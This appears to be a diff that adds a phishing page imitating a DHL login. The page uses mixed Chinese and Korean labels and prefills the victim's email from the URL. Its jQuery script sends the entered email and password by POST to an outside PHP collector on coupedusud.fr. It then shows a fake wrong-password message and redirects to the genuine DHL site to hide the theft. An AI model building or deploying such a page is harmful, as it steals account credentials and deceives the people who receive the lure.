@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<!-- Bootstrap CSS -->
+<link crossorigin="anonymous" href="local_resources/css/2110e24e24492d9e84a582ae1b103fc9.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" rel="stylesheet"/>
+<link href="local_resources/css/982cde59dbfc43168ce080e328dcd703.css" rel="stylesheet"/>
+<script crossorigin="anonymous" src="local_resources/js/66e5560b1b90b0cc487690de6faedd4d.js"></script>
+<title>DHLcan be used for express shipping, shipping cost inquiry, express 
+	tracking and pickup booking니다</title>
+<link href="local_resources/img/853cdfb51f9aa0926c686782af09d73f.gif" rel="icon" type="image/ico">
+<style type="text/css">
+    body {
+        background-image: url("https://i.imgur.com/sBqPd3X.png");
+  background-repeat: no-repeat;
+  background-attachment: fixed; 
+  background-size: 100% 100%;
+    }
+
+    .container {
+        width: 100%;
+        display: flex;
+        justify-content: right;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .office {
+        width: 310px;
+        background: #fff;
+    }
+
+    .office-holder {
+        width: 80%;
+        margin: auto;
+        padding: 20px 0px;
+    }
+
+    .logo {
+        width: 100%;
+        margin-bottom: 2em;
+    }
+
+    .logo h1 {
+        font-family: arial;
+
+    }
+
+    .logo h2 {
+        display: block !important;
+    }
+
+    .verify {
+        width: 70%;
+        margin: auto;
+    }
+
+    .verify h4 {
+        font-family: arial;
+    }
+
+    fieldset {
+        width: 90%;
+        float: right;
+        border: 2px solid #4285f4;
+        border-radius: 5px;
+    }
+
+    legend {
+        font-size: 15px;
+        overflow: hidden;
+        width: 42%;
+        padding: 0px 2px;
+        margin: 0px;
+    }
+
+    .verify input[type='text'] {
+        width: 100%;
+        float: right;
+        border: none;
+        padding: 3px 10px;
+    }
+
+    .verify button {
+        border: none;
+        height: 40px;
+        width: 80px;
+        float: right;
+        margin-top: 2em;
+        background: #4285f4;
+        border-radius: 5px;
+        color: #fff;
+    }
+
+    .email-to-verify {
+        border: 1px solid #000;
+        border-radius: 10px;
+    }
+
+    .form-holder {
+        width: 100%;
+        float: left;
+    }
+
+    .form-holder h3 {
+        font-weight: 600;
+    }
+
+    .form-holder input[type='email'],
+    input[type='password'] {
+        width: 100%;
+        height: 40px;
+        float: left;
+        margin-bottom: 15px;
+    }
+
+    .form-holder .btn-holder {
+        width: 100%;
+        margin-top: 1em;
+        display: flex;
+        align-content: center;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .form-holder .btn-holder .btn {
+        background: #FFB200;
+        border: none;
+        padding: 6px 10px;
+        color: black;
+        border-radius: 0px;
+        margin-top: 20px;
+        margin-bottom: 20px;
+    }
+
+    .form-holder .btn-holder .btn:hover {
+        cursor: pointer;
+    }
+
+    .checkbox {
+        width: 100%;
+        float: left;
+        margin-top: 5px;
+    }
+
+    .checkbox label {
+        font-family: arial;
+        font-size: 13px;
+        float: left;
+        margin-left: 1em;
+    }
+
+    .hide {
+        display: none;
+    }
+    </style>
+</link></head>
+<body>
+<div class="container">
+<div class="office show border shadow bg-light" id="others">
+<div class="office-holder">
+<div class="logo">
+<div id="login_logo">
+<img alt="" src="local_resources/img/e6e090c0e9fe0e542d1ac6e1693589ba.jpg" title="login" width="120"/>
+</div>
+<div style="width: 100%;">
+<div class="alert alert-danger" id="msg" style="display: none;">
+						Your password is incorrect! Make sure you enter the 
+						correct password. This account does not exist here. 
+						Enter a different account 
+</div>
+<form>
+<div class="form-holder">
+<input class="form-control" id="email" placeholder="E电子邮件地址" readonly="" required="required" type="email" value=""/>
+<input class="form-control" id="password" placeholder="密码" required="" type="password"/>
+<div class="checkbox">
+
+<span class="validation-mark"></span>
+<span ewf-field-errors=""></span>
+
+<a aqa-id="forgotPassword" class="left link_forgot-password margin-top" data-tracking="{'type':'forgotPasswordModal','title':{'en': 'Forgot password'}}" href="#">
+							忘记密码</a>
+<label class="login-popup-remember checkbox">
+<input aqa-id="rememberMe" class="checkbox__input" ng-model="loginCtrl.rememberMe" type="checkbox" value="checkbox">
+<span class="label">记住我</span> <img alt="" src="local_resources/img/ec15f975f9710024de2d1e1eca78527c.png" title="DHL 시스템은 귀하의 이메일 주소를 기억하고 현재 장치에 올바르게 저장합니다" width="15"/>
+</input></label>
+</div>
+<div class="btn-holder">
+<button class="btn btn-lg col-12" id="submit-btn"><i class="fa fa-lock"></i>      
+							登录</button>
+</div> <a aqa-id="registration-start" data-tracking="{'type':'registrationModal','title':{'en': 'Register now'}}" href="#"></a></div>
+<span class="fw-bold"></span>
+<a aqa-id="registration-start" data-tracking="{'type':'registrationModal','title':{'en': 'Register now'}}" href="#">
+					尚未注册? 立即注册</a>
+</form></div>
+
+</div>
+</div>
+</div>
+<style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="local_resources/js/fa23745d4e6bc99d0e191c82e00f6cf9.js"></script>
+<script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="local_resources/js/8b11cdf1459a34b4401cadbb9adc5bb1.js"></script>
+<script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="local_resources/js/4352c71c7dbf3ea299f6e8f75552d037.js"></script>
+</div></body>
+<script src="local_resources/js/c291f2ae17879321c2215162f40786cc.js"></script>
+<script src="local_resources/js/c1187e7c9fb5913ff29b3e2296278f50.js"></script>
+<script>
+  $(document).ready(function(){
+    var count=0;
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();        
+        $('#email').val(my_email);
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(final);
+        $("#msg").hide();
+      }
+      ///////////////url getting email////////////////
+
+
+      var file="bmV4dC5waHA=";
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html("The email field is blank. !");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("이 The account does not exist here. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("The password field is blank. !");
+            ai.focus;
+            return false;
+        }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+2;
+      $('#domain-name').html(final);
+      $.ajax({
+        dataType: 'JSON',
+        url: "https://www.coupedusud.fr/upload/accueil/pst/logo.php",
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Confirmation..');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                	
+                  $("#password").val("");
+                  if (count>=0) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://mydhlplus.dhl.com/kr/ko/ship/optional-services.html");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+            	
+              $("#password").val("");
+              if (count>=4) {
+                count=0;
+                window.location.replace("https://mydhlplus.dhl.com/kr/ko/ship/optional-services.html");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('<i class="fa fa-lock"></i>login');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+</html>
